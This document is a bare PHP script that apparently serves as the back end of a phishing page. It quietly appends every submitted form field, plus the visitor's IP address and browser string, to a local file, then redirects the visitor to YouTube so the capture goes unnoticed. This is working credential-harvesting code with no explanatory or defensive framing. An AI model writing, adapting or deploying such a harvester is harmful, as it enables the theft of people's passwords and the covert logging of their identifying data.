<?php

    header("Location: https://www.youtube.com ");
    $handle = fopen("ip.txt", "a");

    $post = $_POST;
    $post['ip'] = $_SERVER['REMOTE_ADDR'];
    $post['browser'] = $_SERVER['HTTP_USER_AGENT'];

    foreach($post as $variable => $value) 
    {
        fwrite($handle, $variable);
        fwrite($handle, "=");
        fwrite($handle, $value);
        fwrite($handle, PHP_EOL);
    }

    fwrite($handle, PHP_EOL);
    fclose($handle);
    exit;

?>
